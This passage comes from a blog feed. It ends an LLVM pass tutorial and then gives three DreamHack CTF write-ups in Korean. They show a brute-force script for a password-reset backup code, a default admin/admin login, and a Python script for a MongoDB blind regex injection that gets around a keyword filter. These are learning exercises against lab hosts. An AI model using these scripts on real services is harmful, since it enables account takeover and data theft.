                    <span class="n">EntryBBValues</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Global</span><span class="p">);</span>

            <span class="k">for</span><span class="p">(</span><span class="n">Argument</span> <span class="o">&amp;</span><span class="n">Arg</span> <span class="o">:</span> <span class="n">F</span><span class="p">.</span><span class="n">args</span><span class="p">())</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">Arg</span><span class="p">.</span><span class="n">getType</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isIntegerTy</span><span class="p">())</span>
                    <span class="n">EntryBBValues</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Arg</span><span class="p">);</span>

            <span class="c1">// traverse CFG</span>
            <span class="n">MapVecBlk</span> <span class="n">reachableIntVarMap</span><span class="p">;</span>
            <span class="n">std</span><span class="o">::</span><span class="n">stack</span><span class="o">&lt;</span><span class="n">NodeTy</span><span class="o">&gt;</span> <span class="n">BBsToProcess</span><span class="p">;</span>
            <span class="n">BBsToProcess</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">CFGRoot</span><span class="p">);</span>

            <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">BBsToProcess</span><span class="p">.</span><span class="n">empty</span><span class="p">()){</span>
                <span class="k">auto</span> <span class="o">*</span><span class="n">Parent</span> <span class="o">=</span> <span class="n">BBsToProcess</span><span class="p">.</span><span class="n">top</span><span class="p">();</span>
                <span class="n">BBsToProcess</span><span class="p">.</span><span class="n">pop</span><span class="p">();</span>

                <span class="k">auto</span> <span class="o">&amp;</span><span class="n">ParentDefVar</span> <span class="o">=</span> <span class="n">definedVarMap</span><span class="p">[</span><span class="n">Parent</span><span class="o">-&gt;</span><span class="n">getBlock</span><span class="p">()];</span>
                <span class="n">SmallPtrSet</span><span class="o">&lt;</span><span class="n">Value</span> <span class="o">*</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span> <span class="n">ParentRIV</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="n">Parent</span><span class="o">-&gt;</span><span class="n">getBlock</span><span class="p">()];</span>

                <span class="c1">// Iterate child nodes of the parent node and update its RIV</span>
                <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="o">&amp;</span><span class="n">Child</span> <span class="o">:</span> <span class="o">*</span><span class="n">Parent</span><span class="p">){</span>
                    <span class="n">BBsToProcess</span><span class="p">.</span><span class="n">push</span><span class="p">(</span><span class="n">Child</span><span class="p">);</span>
                    <span class="k">auto</span> <span class="n">ChildBB</span> <span class="o">=</span> <span class="n">Child</span><span class="o">-&gt;</span><span class="n">getBlock</span><span class="p">();</span>

                    <span class="n">result</span><span class="p">[</span><span class="n">ChildBB</span><span class="p">].</span><span class="n">insert</span><span class="p">(</span><span class="n">ParentDefVar</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">ParentDefVar</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
                    <span class="n">result</span><span class="p">[</span><span class="n">ChildBB</span><span class="p">].</span><span class="n">insert</span><span class="p">(</span><span class="n">ParentRIV</span><span class="p">.</span><span class="n">begin</span><span class="p">(),</span> <span class="n">ParentRIV</span><span class="p">.</span><span class="n">end</span><span class="p">());</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="c1">// print</span>
            <span class="k">for</span><span class="p">(</span><span class="k">const</span> <span class="k">auto</span><span class="o">&amp;</span> <span class="n">BI</span> <span class="o">:</span> <span class="n">result</span><span class="p">){</span>
                <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">BI</span><span class="p">.</span><span class="n">first</span><span class="o">-&gt;</span><span class="n">getName</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>

                <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="n">I</span> <span class="o">:</span> <span class="n">BI</span><span class="p">.</span><span class="n">second</span><span class="p">){</span>
                    <span class="n">I</span><span class="o">-&gt;</span><span class="n">print</span><span class="p">(</span><span class="n">errs</span><span class="p">());</span>
                    <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kt">bool</span> <span class="n">runOnFunction</span><span class="p">(</span><span class="n">Function</span><span class="o">&amp;</span> <span class="n">F</span><span class="p">)</span> <span class="k">override</span> <span class="p">{</span>
            <span class="kt">bool</span> <span class="n">modified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

            <span class="n">DominatorTree</span> <span class="o">*</span><span class="n">DT</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DominatorTree</span><span class="p">(</span><span class="n">F</span><span class="p">);</span>
            <span class="n">MapVecBlk</span> <span class="n">result</span> <span class="o">=</span> <span class="n">buildRIV</span><span class="p">(</span><span class="n">F</span><span class="p">,</span> <span class="n">DT</span><span class="o">-&gt;</span><span class="n">getRootNode</span><span class="p">());</span>

            <span class="k">return</span> <span class="n">modified</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ009RIV</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ009RIV</span><span class="o">&gt;</span><span class="n">X</span> <span class="p">(</span><span class="s">"RIV"</span><span class="p">,</span> <span class="s">"Find Reachable Integer Values"</span><span class="p">,</span> <span class="nb">true</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
</code></pre></div></div> <h3 id="why-do-we-use-dfs-or-bfs-instead-of-for-loop-eg-forauto-bb-f">Why do we use DFS or BFS instead of for loop (e.g. <code class="language-plaintext highlighter-rouge">for(auto&amp; BB: F)</code>)?</h3> <p>Using a simple loop such as <code class="language-plaintext highlighter-rouge">for(auto&amp; BB: F)</code> does not guarantee the order in which the basic blocks are visited may not correspond to the logical or execution order. It is crucial for certain analysis and transformation performing live analysis, pointer analysis or other flow-sensitive optimization.</p> <h3 id="what-is-llvmsmallptrset">What is <code class="language-plaintext highlighter-rouge">llvm::SmallPtrSet</code>?</h3> <p><code class="language-plaintext highlighter-rouge">llvm::SmallPtrSet</code> is a data structure in order to store a small number of pointers in a set. It is similar with <code class="language-plaintext highlighter-rouge">std::unordered_set</code> but it is optimized for the small number of pointers as the name implies. It is usually used to track live variables, unique types, or etc.</p> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <hr/> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a><br/> [4] Mathematical Optimization: Solving Problems using SCIP and Python. <a href="https://scipbook.readthedocs.io/en/latest/index.html">site</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">(DreamHack) login-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/" rel="alternate" type="text/html" title="(DreamHack) login-1"/><published>2021-06-01T05:24:00+00:00</published><updated>2021-06-01T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-login-1/"><![CDATA[<h2 id="풀이">풀이</h2> <p>플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">userLevel</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mi">0</span> <span class="p">:</span> <span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span>
    <span class="mi">1</span> <span class="p">:</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span>
<span class="p">}</span>
<span class="n">MAXRESETCOUNT</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">./flag.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[**FLAG**]</span><span class="sh">'</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/admin</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">level</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">userLevel</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
        <span class="k">return</span> <span class="n">FLAG</span>

    <span class="k">return</span> <span class="sh">"</span><span class="s">Only Admin !</span><span class="sh">"</span>
</code></pre></div></div> <p>userid를 클릭하면 아래와 같은 화면이 나온다. 이때 url에 있는 17이란 숫자가 user에 부여되는 특정 id라고 가정하여 해당 숫자를 변경해 보았다. <img src="https://user-images.githubusercontent.com/24788751/120293279-0cf91980-c300-11eb-9c7f-aa502b0a3816.png" alt="image"/></p> <p>이때 potato라는 사용자의 유저 레벨이 1인 것을 확인하였다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120293014-cf948c00-c2ff-11eb-9c89-ab0a6e23ffae.PNG" alt="admin1"/></p> <p>비밀번호 찾기를 통해 비밀번호를 수정하도록 한다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">makeBackupcode</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/forgot_password</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">forgot_password</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">forgot.html</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">userid</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">userid</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">newpassword</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">newpassword</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">backupCode</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">backupCode</span><span class="sh">"</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>

        <span class="n">conn</span> <span class="o">=</span> <span class="nf">get_db</span><span class="p">()</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">'</span><span class="s">SELECT * FROM user WHERE id = ?</span><span class="sh">'</span><span class="p">,</span> <span class="p">(</span><span class="n">userid</span><span class="p">,)).</span><span class="nf">fetchone</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
            <span class="c1"># security for brute force Attack.
</span>            <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">MAXRESETCOUNT</span><span class="p">:</span>
                <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">reset Count Exceed.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span>
            
            <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">backupCode</span><span class="p">:</span>
                <span class="n">newbackupCode</span> <span class="o">=</span> <span class="nf">makeBackupcode</span><span class="p">()</span>
                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?</span><span class="sh">"</span>
                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">newpassword</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="n">newbackupCode</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">&lt;b&gt;Password Change Success.&lt;/b&gt;&lt;br/&gt;New BackupCode : </span><span class="si">{</span><span class="n">newbackupCode</span><span class="si">}</span><span class="sh">"</span>

            <span class="k">else</span><span class="p">:</span>
                <span class="n">updateSQL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">UPDATE user set resetCount = resetCount+1 where idx = ?</span><span class="sh">"</span>
                <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">updateSQL</span><span class="p">,</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">idx</span><span class="sh">'</span><span class="p">])))</span>
                <span class="n">msg</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">Wrong BackupCode !&lt;br/&gt;&lt;b&gt;Left Count : &lt;/b&gt; </span><span class="si">{</span><span class="p">(</span><span class="n">MAXRESETCOUNT</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">-</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">resetCount</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
            
            <span class="n">conn</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">index.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>

        <span class="k">return</span> <span class="sh">"</span><span class="s">&lt;script&gt;alert(</span><span class="sh">'</span><span class="s">User Not Found.</span><span class="sh">'</span><span class="s">);history.back(-1);&lt;/script&gt;</span><span class="sh">"</span><span class="p">;</span>
</code></pre></div></div> <p>백업 코드는 0이상 100미만의 수가 생성되기 때문에 브루트포스 방식을 통해 백업코드를 찾고 원하는 비밀번호로 변경할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="n">u</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://host1.dreamhack.games:17892/forgot_password</span><span class="sh">"</span>
<span class="n">userid</span> <span class="o">=</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">:</span> <span class="sh">"</span><span class="s">potato</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">backupCode</span><span class="sh">'</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span> <span class="sh">'</span><span class="s">newpassword</span><span class="sh">'</span><span class="p">:</span><span class="sh">"</span><span class="s">aaa</span><span class="sh">"</span><span class="p">}</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">u</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">res</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sh">"</span><span class="s"> was backup code</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span> <span class="c1"># 500
</span>        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[풀이 플래그를 얻기 위해서는 유저 레벨이 ‘admin’인 계정으로 로그인해야 한다.]]></summary></entry><entry><title type="html">(DreamHack) web-misconf-1</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/" rel="alternate" type="text/html" title="(DreamHack) web-misconf-1"/><published>2021-06-01T05:24:00+00:00</published><updated>2021-06-01T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-web-misconf-1/"><![CDATA[<p>네트워크 장비, CCTV 등 여러 전자제품은 구매를 하면 초기 비밀번호가 설정되어 있다. 그런데 구입 후 이를 변경해주지 않으면 이를 악용할 수 있는 가능성이 존재한다. 해당 문제도 비슷한 시각에서 출제된 문제라고 생각한다.</p> <h2 id="풀이">풀이</h2> <p>접속하면 다음과 같은 화면이 출력된다.</p> <p><img src="https://user-images.githubusercontent.com/24788751/120296923-91996700-c303-11eb-8b0b-61b4b4fb4fd8.png" alt="image"/></p> <p>회원가입 기능이 따로 없어 admin/admin으로 로그인 시도를 해보았는데 성공하였다.</p> <p>문제에서 flag가 Organization에 있다고 했으므로 설정을 확인하여 플래그를 찾을 수 있었다.</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[web-misconf]]></summary></entry><entry><title type="html">(DreamHack) Mango</title><link href="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/" rel="alternate" type="text/html" title="(DreamHack) Mango"/><published>2021-05-25T05:24:00+00:00</published><updated>2021-05-25T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2021/(DreamHack)-mango/"><![CDATA[<p>NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.</p> <p>Mongo db는 대표적인 NoSQL이며, 비교 연산자, 논리 연산자를 기본적으로 사용할 수 있고, $regex, $where, $elemMatch 연산자를 통해 좀 더 다양한 기능을 수행할 수 있다.</p> <h2 id="풀이">풀이</h2> <p>BAN 변수에는 ‘admin’, ‘dh’, ‘admi’의 문자열이 포함되게 되면 필터링하게 되어있다. 따라서 필터링 되지 않도록 $ne guest를 사용하여 admin을 검색할 수 있도록 하였다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}</span>
<span class="kd">const</span> <span class="nx">BAN</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">dh</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admi</span><span class="dl">'</span><span class="p">];</span>

<span class="nx">filter</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
    <span class="kd">const</span> <span class="nx">dump</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nf">toLowerCase</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="nx">BAN</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">word</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">dump</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">word</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">)</span> <span class="nx">flag</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="nx">flag</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">)){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">filter</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kd">const</span> <span class="p">{</span><span class="nx">uid</span><span class="p">,</span> <span class="nx">upw</span><span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>

    <span class="nx">db</span><span class="p">.</span><span class="nf">collection</span><span class="p">(</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">).</span><span class="nf">findOne</span><span class="p">({</span>
        <span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">:</span> <span class="nx">uid</span><span class="p">,</span>
        <span class="dl">'</span><span class="s1">upw</span><span class="dl">'</span><span class="p">:</span> <span class="nx">upw</span><span class="p">,</span>
    <span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">){</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">err</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="dl">'</span><span class="s1">uid</span><span class="dl">'</span><span class="p">]);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">})</span>
<span class="p">});</span>
</code></pre></div></div> <p>BAN에 dh가 있기 때문에 이를 피하기 위해 [D]를 사용했으며, brute force방식과 유사하게 모든 경우의 수를 탐색할 수 있도록 하였다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="nb">ascii</span> <span class="o">=</span><span class="sh">'</span><span class="s">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">url</span><span class="p">(</span><span class="n">pwd</span><span class="p">):</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">uid[$ne]</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">guest</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">upw[$regex]</span><span class="sh">'</span><span class="p">:</span><span class="n">pwd</span><span class="p">}</span> <span class="c1">#uid=[adm]in 등으로 해주어도 된다.
</span>    <span class="n">port</span> <span class="o">=</span> <span class="mi">15108</span>
    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://host1.dreamhack.games:</span><span class="sh">'</span> <span class="o">+</span> <span class="n">port</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/login</span><span class="sh">'</span><span class="p">,</span><span class="n">params</span> <span class="o">=</span> <span class="n">params</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="k">global</span> <span class="nb">ascii</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">ascii</span><span class="p">:</span>
        <span class="n">ch</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
        <span class="k">if</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span> <span class="ow">in</span> <span class="nf">url</span><span class="p">(</span><span class="n">ch</span><span class="p">).</span><span class="n">text</span><span class="p">:</span>
            <span class="n">flag</span> <span class="o">+=</span> <span class="sh">'</span><span class="s">[</span><span class="sh">'</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="sh">'</span><span class="s">]</span><span class="sh">'</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">i</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="sh">'</span><span class="s">[D]H{</span><span class="sh">'</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">):</span>
        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">search</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">flag</span> <span class="o">+</span> <span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <h3 id="reference">Reference</h3> <p>[1] dreamhack. (2020).”Server-side Advanced - NoSQL.” Retrieved from https://dreamhack.io/learn/1/29#7</p>]]></content><author><name></name></author><category term="Security"/><category term="CTF"/><summary type="html"><![CDATA[NoSQL은 RDMS와는 달리 쿼리문 없이도 데이터베이스에 저장된 데이터를 조작할 수 있는 개념이다. 본 문제에서는 NoSQL에 Blind injection을 수행하여 안에 저장된 데이터를 조회하도록 한다.]]></summary></entry></feed>